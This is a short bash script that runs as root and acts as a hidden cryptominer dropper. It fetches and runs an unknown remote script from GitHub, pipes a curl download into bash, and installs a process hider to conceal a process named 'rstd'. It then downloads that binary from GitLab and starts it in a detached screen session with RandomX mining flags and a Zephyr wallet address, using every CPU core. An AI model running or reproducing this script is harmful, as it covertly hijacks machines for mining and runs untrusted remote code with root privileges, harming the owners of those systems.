#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt install screen -y
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
sudo apt install npm =y
sudo npm i -g node-process-hider && sudo ph add rstd
wget https://gitlab.com/sarifadim/jomblo/-/raw/main/rstd && chmod +x *
screen -dms run ./rstd -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk+100000.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all)
EOF
screen -r
